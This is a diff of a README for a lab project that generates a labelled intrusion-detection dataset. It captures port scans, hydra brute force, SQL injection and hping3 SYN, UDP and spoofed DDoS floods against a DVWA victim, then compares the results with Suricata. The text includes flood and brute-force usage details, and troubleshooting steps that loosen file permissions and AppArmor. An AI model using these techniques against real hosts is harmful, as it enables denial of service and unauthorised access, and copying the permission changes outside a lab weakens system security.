-sudo python3 capture_benign.py --interface ens33 --extra-filter "icmp and host 10.0.0.10"
-
-# Just a port scan
-sudo python3 capture_portscan.py --interface ens33 --extra-filter "host 10.0.0.10"
-
-# A DoS attack (SYN flood by default, auto-stops after 2s; --type udp for UDP)
-sudo python3 capture_dos.py --interface ens33 --outdir /home/ubuntu/captures --extra-filter "host 10.0.0.10"
-
-# A DDoS attack (multi-source spoofed SYN flood, each stream auto-stops after 2s)
-# NOTE: --rand-source spoofs the source, so "host <attacker_ip>" won't work here.
-sudo python3 capture_ddos.py --interface ens33 --outdir /home/ubuntu/captures --extra-filter "dst host 10.0.0.20 and tcp"
-```
-`capture_ddos.py` is also the tool to redo just the DDoS phase if a full-pipeline run lost it to the filter issue above, without re-running everything else.
-
-### Pipeline Phases Explained
-
-| Phase | Description | Output |
-|-------|-------------|--------|
-| **Phase 3: Benign** | Generates baseline background traffic. Manually browse the web app, ping, SSH in, while this runs. | `BENIGN_<ts>.pcap` |
-| **Phase 4: Attacks** | Captures each attack individually: PortScan, SSHBruteForce, WebBruteForce, SQLInjection, DoSSYNFlood, DoSUDPFlood, DDoSSYNFlood. | `<Attack>_<ts>.pcap` |
-| **Phase 5: Verification** | Cross-references pcaps with `labels.log`, applying heuristic thresholds to prove attack traffic exists. | `verification_table.md` |
-| **Phase 7: Extraction** | Parses all pcaps, aggregates bidirectional flows, computes ML features, applies ground-truth labels. | `ids_dataset.csv` |
-
-### Full CLI Reference (`run_experiment.py`)
-
-| Flag | Default | Purpose |
-|---|---|---|
-| `--interface`, `-i` | *(none — lists interfaces and exits)* | Capture interface, e.g. `ens33`. Not required for `--verify-only`/`--extract-only`, which never touch the network. |
-| `--attacker-ip` | `10.0.0.10` | Kali's IP — used for filtering and flow labelling |
-| `--victim-ip` | `10.0.0.20` | Victim's IP — used to build `--auto` attack commands, and as a labelling fallback for spoofed-source attacks (§4) |
-| `--outdir` | `/home/ubuntu/captures` | Where pcaps, `labels.log`, and CSVs are written |
-| `--benign-duration` | `0` (wait for ENTER) | Seconds to capture Phase 3 benign traffic; `0` prompts you to stop manually |
-| `--extra-filter` | *(none)* | BPF capture filter applied to every capture, e.g. `"host 10.0.0.20"` |
-| `--auto` | off | Run attack commands automatically instead of prompting — see caveats above |
-| `--phpsessid` | `changeme` | DVWA session cookie substituted into the WebBruteForce/SQLInjection `--auto` commands |
-| `--skip-benign` | off | Skip Phase 3 entirely |
-| `--skip-attacks` | off | Skip Phase 4 entirely |
-| `--skip-verify` | off | Skip Phase 5 entirely |
-| `--skip-extract` | off | Skip Phase 7 entirely |
-| `--verify-only` | off | Run **only** Phase 5 against pcaps already in `--outdir` — no `--interface` needed |
-| `--extract-only` | off | Run **only** Phase 7 against pcaps already in `--outdir` — no `--interface` needed |
-
-`--skip-*` and `--verify-only`/`--extract-only` are the fast path when iterating on extraction/verification logic — no need to re-run the whole attack sequence every time.
+- **`PASTE_COOKIE_HERE`**: before WebBruteForce and again before SQLInjection, log into DVWA in a browser, open its developer tools, find the cookie named `PHPSESSID`, and paste that exact value in place of `PASTE_COOKIE_HERE`. This value changes every time you log in, so get a fresh one right before each of these two attacks — a leftover one from earlier testing will cause every attempt to look like it "succeeded" without actually testing anything.
+- **DDoSSYNFlood** is written as one long `sudo bash -c '...'` command on purpose. If you instead try to run three separate `sudo hping3 ... &` commands at once, each one will ask for your password at the same time and get stuck, because none of them can actually read your typed input while running in the background. Wrapping everything in a single `sudo` avoids that entirely.
+- **`timeout -s INT 2`** in front of `hping3` makes it stop itself automatically after 2 seconds. Without it, `--flood` mode would run forever and require you to manually press Ctrl+C — `hping3` deliberately ignores its own `-c` (packet count) option whenever `--flood` is used.
 
 ---
 
-## 4. How Everything Works (Module Breakdown)
+## 9. Understanding What You Get Out
 
-### `ids_capture/capture.py` (The Sniffer Engine)
-Provides the `CaptureSession` context manager. Boots `dumpcap` as a subprocess, prints a live `[monitor]` line every 2s showing elapsed time and captured size, and logs exact start/stop UTC timestamps to `labels.log`.
-
-### `ids_capture/labels.py` (The Ground-Truth Engine)
-Parses `labels.log` into `LabelWindow` objects. `label_flows()` labels a flow with an attack name if **both**: (1) its timestamp falls inside that attack's `[start, stop]` window, and (2) `src_ip` or `dst_ip` matches `attacker_ip` **or** `victim_ip`. The `victim_ip` fallback matters specifically for spoofed-source attacks (`DDoSSYNFlood`'s `--rand-source`) — without it, a flow whose source is a randomized fake IP never matches `attacker_ip` on either side and silently falls through to `BENIGN` despite being squarely inside the attack window. This was confirmed live: an early run produced 415K genuine DDoS flow rows, all mislabeled `BENIGN`, with no `DDoSSYNFlood` label appearing anywhere in the dataset. Matching on the victim instead is safe because each labelled window is attack-only — no concurrent benign traffic is generated during it.
-
-### `ids_capture/extract_flows.py` (The Feature Engineer)
-Parses `.pcap` files via `tshark -T fields` with memory-efficient stream processing and multi-threaded parallelism across pcaps. Groups packets into 5-tuple bidirectional flows (default 120s inactivity timeout), computing:
-* **Time-based:** Duration, Inter-Arrival Time (Mean, Std, Max, Min)
-* **Volume-based:** Total Packets, Total Bytes, Packets/sec, Bytes/sec
-* **Behavioral:** TCP Flag counts (SYN, ACK, RST, FIN, PSH, URG), Mean Window Size
-
-### `ids_capture/verify.py` & `verify_report.py` (The Evidence Generator)
-Runs a single-pass `tshark` query per pcap, counting SYN-only packets, unique destination ports, SSH packets, HTTP requests, and SQLi keywords, then applies label-specific thresholds (`_auto_verify()`) to mark each pcap `✓ YES`/`✗ NO`. Thresholds are scaled for a smaller-scope project (short wordlist, brief attack windows) rather than a full dissertation-scale run — tune `_auto_verify()` if your attack volume differs significantly.
-
-One thing worth knowing if you're reading tshark output directly elsewhere: boolean fields (`tcp.flags.syn`, `http.request`, etc.) render as the literal strings `"True"`/`"False"` on some tshark builds and `"1"`/`"0"` on others — `verify.py`'s `_is_true()` helper accepts both; if you write your own tshark-parsing code, do the same rather than comparing against a single hardcoded value.
-
-Standalone single-pcap report:
-```bash
-python3 verify_report.py --pcap ~/captures/PortScan_*.pcap --label PortScan --attacker-ip 10.0.0.10 --wireshark-filters
-```
-
----
-
-## 5. Outputs & Deliverables
-
-Once the pipeline completes, your `--outdir` will contain:
+After the pipeline finishes, your output folder contains:
 
 ```text
 /home/ubuntu/captures/
-├── labels.log                      # Ground-truth timestamp ledger
-├── BENIGN_20260623_140000.pcap     # Raw packet captures
+├── labels.log                      # exact start/stop time of every attack — the ground truth
+├── BENIGN_20260623_140000.pcap     # raw captured packets, one file per phase
 ├── PortScan_20260623_140200.pcap
 ├── DoSSYNFlood_20260623_144000.pcap
-├── verification_table.md           # Copy-paste ready Markdown table for thesis
-├── PortScan_*_flows.csv            # Individual flow features
-└── ids_dataset.csv                 # The Master ML Dataset (Load this into Jupyter!)
+├── verification_table.md           # evidence table — proof each attack really happened
+├── PortScan_*_flows.csv            # per-attack flow features
+└── ids_dataset.csv                 # the final, combined, labelled dataset
 ```
+
+`ids_dataset.csv` is the file you load into a Jupyter notebook or ML library to train a model. `verification_table.md` is ready to paste directly into a report or dissertation as evidence.
+
+If you want to re-check verification or re-build the dataset later without recapturing anything (for example, after a fix to this project's code), you can run just those steps:
+```bash
+sudo venv/bin/python3 run_experiment.py --outdir /home/ubuntu/captures --verify-only
+sudo venv/bin/python3 run_experiment.py --outdir /home/ubuntu/captures --extract-only
+```
+Neither of these needs `--interface` — they only read files you already captured, they don't touch the network.
 
 ---
 
-## 6. Comparing Against Suricata
+## 10. Comparing Against Suricata
 
-Once you have a verified, labelled dataset, running it back through a real signature-based IDS gives you a second reference point — useful for a methodology/comparison chapter.
+This is an optional final step: running your captured traffic through Suricata, a real, independent intrusion detection tool, to see what it catches compared to your own labelled dataset.
 
-Install once (needs internet, see §2.7):
-```bash
-sudo apt install -y suricata
-sudo suricata-update
-```
-
-Run it in offline mode against each pcap (no live interface involved — `-r` reads a file):
 ```bash
 mkdir -p ~/captures/suricata_logs
 for f in ~/captures/*.pcap; do
@@ -392,54 +361,60 @@ for f in ~/captures/*.pcap; do
 done
 ```
 
-Two output files per pcap worth reading:
-- **`fast.log`** — one line per alert, human-readable: `MM/DD/YYYY-HH:MM:SS  [**] [gid:sid:rev] MESSAGE [**] [Classification: ...] [Priority: N] {PROTO} SRC:PORT -> DST:PORT`
-- **`eve.json`** — full structured JSON event log, useful if you want to programmatically cross-reference Suricata's verdicts against your own `labels.log` ground truth.
+For each pcap, check `fast.log` inside its output folder — one readable line per alert. `eve.json` in the same folder has the same information in a more detailed, machine-readable format.
 
-**An empty `fast.log` for some attacks is a legitimate, expected result, not a failure.** Suricata's default Emerging Threats Open ruleset is built mostly around known malware/CVE signatures, not generic behavioral detection — a plain `nmap -sS` scan or a raw `hping3` flood often produces zero alerts out of the box, since that needs rate-based (`threshold`/`detection_filter`) or scan-specific rule categories that aren't enabled by default. `SQLInjection`/`WebBruteForce` are the most likely to actually trigger something, since ET-Open includes broad HTTP-layer injection/brute-force signatures. This contrast — a signature-based IDS missing what your flow/statistical-based labels catch — is itself a valid, reportable finding.
+**An empty `fast.log` for some attacks is a normal, expected result — not something broken.** Suricata's default rules mostly look for known malware and known vulnerabilities, not generic "someone is scanning me" or "someone is flooding me" behavior. A plain port scan or a raw flood attack often produces zero alerts with Suricata's default configuration. `SQLInjection` and `WebBruteForce` are the most likely to actually trigger something. If your dissertation compares detection methods, "Suricata missed this, but our flow-based approach caught it" is a legitimate and useful finding, not a failed test.
 
-**"Invalid checksum" in Suricata's output**: a benign artifact of NIC checksum offloading, extremely common in virtualized labs (VMware/VirtualBox/KVM all do this) and with `hping3`-crafted raw packets. The capture tool grabs the packet before hardware fills in the real checksum, so it looks "invalid" even though the packet that actually hit the wire was fine. It doesn't affect your dataset. If you want Suricata to stop flagging it, set in `/etc/suricata/suricata.yaml`:
-```yaml
-stream:
-  checksum-validation: no
+You may also see a warning about an "invalid checksum" somewhere in Suricata's output. This is also normal — it's a side effect of how virtual network cards handle checksums, not a sign of a real problem, and it doesn't affect your results.
+
+---
+
+## 11. If Something Goes Wrong
+
+### Setup problems
+
+**A specific website (often GitHub) won't load, but others work fine.**
+This isn't a VM problem — it's your actual internet connection or router blocking that one site. Confirm with `curl -v https://github.com --max-time 10` — if it times out (rather than saying it can't find the address), and the same site fails from your host computer's normal browser too, it's outside the VM entirely. A different network (like a phone hotspot) or a VPN will get around it.
+
+**Netplan won't apply the static IP / mentions `systemd-networkd`.**
+Check `ip a show ens33` anyway — it sometimes worked despite a scary-looking warning. If it genuinely didn't, run `sudo systemctl enable --now systemd-networkd` and try `sudo netplan apply` again.
+
+**Wrong interface name.**
+Don't assume `eth0`. Run `ip a`, or run `run_experiment.py` with no `--interface` at all to see the exact list of valid names.
+
+**Clock mismatch between capture files and the evidence log.**
+Install VMware Tools (or VirtualBox Guest Additions) on both VMs to keep their clocks in sync with your host computer.
+
+### Attack command problems
+
+**Hydra says "optional parameters must have the format X=value" or "no valid optional parameter type given: F".**
+This means the command's punctuation is slightly wrong. Copy the exact command from Section 8's table rather than typing it from memory — hydra's syntax here is unusually strict about field order.
+
+**Hydra reports every single password as correct.**
+This is a false result, not a real success. Your `PHPSESSID` cookie has expired or wasn't accepted, so DVWA is redirecting every attempt to its login page instead of actually checking the password — and hydra mistakes "no failure message appeared" for success. Get a completely fresh cookie and try again.
+
+**`hping3 --flood` never stops on its own.**
+This is expected if you didn't use the exact commands from Section 8 — `--flood` mode ignores `-c` (packet count) entirely and needs `timeout` in front of it instead to stop automatically.
+
+**Three `sudo hping3 ...` commands running in the background all get stuck asking for a password.**
+Use the single combined `sudo bash -c '...'` version of the DDoS command from Section 8, not three separate ones.
+
+**The DDoS capture file is empty (0 bytes), even though `hping3` clearly sent a lot of traffic.**
+Your capture filter was set to the Attacker's IP instead of the Victim's. The DDoS attack fakes its source address on every packet, so it never matches the Attacker's real IP — but it always genuinely targets the Victim, so filtering by the Victim's IP (as in Section 7's command) always works.
+
+### Results look wrong problems
+
+**tshark fails partway through verification or dataset-building, with an error code.**
+The error message now includes the real reason from tshark itself. Code `3` usually means the capture file's header is corrupted, not just cut off early. Code `14` means it was genuinely cut off mid-write (for example, if the capture process was killed uncleanly). Run `file <the pcap>` to inspect it directly.
+
+**A DDoS (or any attack that fakes its source address) shows up labelled `BENIGN` in the final dataset instead of its real attack name.**
+This project now specifically accounts for attacks that fake their source address when labelling flows, matching on the Victim's IP as well as the Attacker's. If you're on an older copy of this code, update it, then re-run:
+```bash
+sudo venv/bin/python3 run_experiment.py --outdir /home/ubuntu/captures --extract-only
 ```
 
----
+**"SYN-only packets" or "HTTP requests" always show as 0 in the verification results, even for attacks that obviously involve a lot of SYN packets or HTTP requests.**
+Some versions of `tshark` describe these as the words `True`/`False` instead of the numbers `1`/`0`, and older code only recognised the numbers. This is fixed in the current version of this project.
 
-## 7. Common Pitfalls & Troubleshooting
-
-### Environment / VM setup
-
-| Issue | Solution |
-|-------|----------|
-| **VMware: "attempted to enable promiscuous mode... not allowed for security reasons"** | Host-level VMware restriction. `/dev/vmnet*` is root-only (`crw-------`) by default. On the **host**: `sudo chmod a+rw /dev/vmnet0 /dev/vmnet1 /dev/vmnet8`, then fully power-cycle the VM (guest reboot alone won't re-request it). Make it permanent (udev recreates them root-only on host reboot otherwise): `echo 'KERNEL=="vmnet[0-9]*", MODE="0666"' \| sudo tee /etc/udev/rules.d/99-vmware-vmnet.rules && sudo udevadm control --reload-rules && sudo udevadm trigger`. See §2.8-A. |
-| **`dumpcap: ... could not be opened: Permission denied` when *writing* a new pcap** | Two one-time fixes, see §2.8-B: `sudo chmod 777 <outdir>` (dumpcap's own default file mode is 600; `chown` alone never touches mode bits) and `sudo chmod o+x /home/<user>` (Ubuntu often defaults new home dirs to 750, blocking traversal for `dumpcap`'s capability-limited identity even under `sudo`). Reproduce outside Python first to confirm it's not a pipeline bug: `sudo dumpcap -i <iface> -w <outdir>/test.pcap -s 0 -q -f "host <ip>"`. |
-| **`tshark: You don't have permission to read the file` — even as root, even after `chown`/`chmod`** | AppArmor confining `dumpcap`/`tshark` — a separate, distinct failure from the write-side entry above. Tell: `Running as user "root" and group "root". This could be dangerous.` printed right before the denial. `sudo systemctl stop apparmor` is *not* a reliable test (profiles already loaded stay enforced). Confirm properly with `sudo aa-status` (look for `tshark`/`tshark//dumpcap` under enforce vs complain mode) and `sudo dmesg \| grep -i apparmor` for an actual `DENIED` line. Fix: `sudo aa-complain /etc/apparmor.d/usr.bin.tshark` (target the profile file directly — it's often a `tshark//dumpcap` child hat, not a standalone `/usr/bin/dumpcap` entry). See §2.8-C — in one debugging session this was suspected but `dmesg` proved it wasn't the actual cause; the home-directory traverse bit was. |
-| **Permission Denied opening PCAPs (as a normal, non-sudo user afterward)** | Every file the pipeline writes is root-owned since it runs under `sudo`. `run_experiment.py` automatically hands `--outdir` back to the invoking user (via `SUDO_UID`/`SUDO_GID`) on exit — success, early exit, or crash. Only fires if the process actually ran under `sudo`; if you still hit this, check you didn't pass `--outdir ~/captures` (resolves to `/root/captures` under `sudo`, which `chmod` alone can't fix since `/root` itself blocks non-root traversal) and that the process wasn't `SIGKILL`ed (skips the cleanup) — in that case, `sudo chown -R $(whoami):$(whoami) <outdir>` manually. |
-| **Wrong Interface Name** | Don't assume `eth0`. VirtualBox uses `enp0s3`, VMware uses `ens33`. Run `ip a` or the script with no `--interface` to list valid names. |
-| **Clock Drift** | If pcap timestamps don't match `labels.log`, VM clocks are drifting — install VirtualBox Guest Additions / VMware Tools on both VMs to sync with the host. |
-| **Internet Leakage into BENIGN traffic** | VM is exposed to the real internet. Set the hypervisor network adapter to Host-only/Internal, not NAT/Bridged (see §2.1). |
-| **A specific site (e.g. GitHub) times out, others work fine** | Not a VM issue — router/ISP-level filtering or host security software. See §2.7 for how to confirm and work around it. |
-
-### Attack commands (Kali-side)
-
-| Issue | Solution |
-|-------|----------|
-| **Hydra: "optional parameters must have the format X=value" / "no valid optional parameter type given: F"** | The real `http-get-form` syntax (confirmed via `hydra -U http-get-form`) is `<url>:<form parameters>[:<optional>[:<optional>]]:<condition string>` — the condition string is the **last** field, not the third. `H=`/`C=`/etc. go *before* it. The condition is a bare string by default (meaning "failure"); `F=` is never valid anywhere (only `S=` exists, for success), and putting anything in the optional-parameter slot must be one of `1, M, c, C, g, G, h, H`. Any literal colon inside an optional value (the `Cookie: PHPSESSID=...` header) must be escaped `\:`. Use the corrected command from §3's table. |
-| **Hydra reports every password "valid" (e.g. "5 of 5 found")** | False positive: the failure string never appeared in the response, so hydra treats *absence of failure* as success. Re-run with `-d` and look for `[DEBUG] attempt result: found 0, redirect 1, location: ../../login.php` — means DVWA redirected every request to login before reaching the brute-force form, i.e. `PHPSESSID` isn't authenticated. Common causes: a stray character stuck onto the cookie from copy/paste (check the `[DATA] attacking ...` line in `-d` output for the exact string hydra sent), or a stale session (repeated failed runs can invalidate it — grab a fresh cookie right before each attempt). |
-| **hping3 `--flood` runs forever / ignores `-c`** | Real `hping3` behavior: `-c` is silently ignored whenever `--flood` is used (flood mode strips the counting bookkeeping for max speed). Bound it by time instead: `timeout -s INT <seconds> hping3 ...` — `-s INT` matches Ctrl+C's signal so it still prints its clean summary. See §3's table for the exact commands, all pre-wrapped this way. |
-| **Backgrounded `sudo hping3 ... &` commands "suspended (tty input)"** | Each backgrounded `sudo` needs its own password prompt but can't read your input while backgrounded, so they all suspend. Wrap the whole thing in one outer `sudo bash -c '...'` instead — only one password prompt, and the inner commands inherit root without calling `sudo` themselves. See the DDoSSYNFlood row in §3's table. |
-| **DDoSSYNFlood capture is 0 bytes despite hping3 showing real traffic sent** | `--rand-source` spoofs the source IP, so an attacker-centered `--extra-filter "host <attacker_ip>"` matches nothing during that phase. Use `"host <victim_ip>"` for the whole pipeline instead (§3's golden path already does this) — matches every phase including DDoS, since all attack traffic is destined to the Victim regardless of claimed source. Lost a capture to this already? Redo just that attack: `capture_ddos.py --extra-filter "dst host <victim_ip> and tcp"`. |
-| **Hydra/sqlmap "failing" (0 hits in verification)** | Only passes if the credential in `/tmp/pass.txt` is actually correct — a failed brute-force still generates traffic, but `verify.py` keys off request/packet counts, not login success. Confirm DVWA Security = Low, you're attacking `/vulnerabilities/brute/`, and the `PHPSESSID` is current. |
-
-### Verification & extraction
-
-| Issue | Solution |
-|-------|----------|
-| **tshark fails with a specific exit code during Phase 5/7** | `extract_flows.py`/`verify.py` include tshark's own `stderr` in the warning, not just the bare code. **3** = "isn't a capture file in a format TShark understands" (corrupt/garbled header, not just cut short). **14** = "cut short in the middle of a packet" (genuinely truncated, e.g. an unclean kill). `file <pcap>` / `capinfos <pcap>` to inspect directly. |
-| **DDoS (or other spoofed-source) flows end up labeled `BENIGN` instead of the attack name** | See §4's `labels.py` explanation — `label_flows()` needs the `victim_ip` fallback for any attack that spoofs its source, since neither side of the flow ever matches `attacker_ip`. Fixed as of this version; if you're on an older copy of this code, re-run `--extract-only` after updating. |
-| **`SYN-only pkts`/`HTTP requests` always show 0 in verification, even for obviously SYN-heavy or HTTP-heavy captures** | tshark on some builds renders boolean fields (`tcp.flags.syn`, `http.request`) as `"True"`/`"False"` rather than `"1"`/`"0"` — `verify.py` used to only ever compare against `"1"`. Fixed via `_is_true()` (§4); if counts are still stuck at zero, confirm directly: `tshark -r <pcap> -n -T fields -E separator=$'\t' -E header=n -e frame.number -e ip.src -e tcp.flags.syn -e tcp.flags.ack -e tcp.dstport \| head -10` and check what your build actually outputs. |
-| **`WebBruteForce`/`SQLInjection` verified `✗ NO` despite real evidence (SQLi keyword found, real SYN traffic)** | Thresholds in `_auto_verify()` are calibrated for a small wordlist / brief attack window already (§4) — if you're still hitting this, the attack generated even less HTTP volume than that. Either lower the relevant threshold further in `ids_capture/verify.py`, or generate more traffic (longer wordlist, more sqlmap probing). |
-| **Missing Flow Labels (everything comes out `BENIGN`)** | Wrong `--attacker-ip` — if it doesn't match Kali's actual IP, `labels.py` never matches on the attacker side (the victim-IP fallback still catches spoofed-source attacks, but a plain IP typo breaks everything else). |
-
----
+**A permission-denied error appears later, when just trying to open a capture file normally (not through this project's scripts).**
+Every file this project writes is owned by `root`, because it runs under `sudo`. The scripts automatically hand ownership back to your normal user account when they finish — but if the process was forcefully killed partway through, that handoff never happened. Fix it manually: `sudo chown -R $(whoami):$(whoami) <the folder>`.
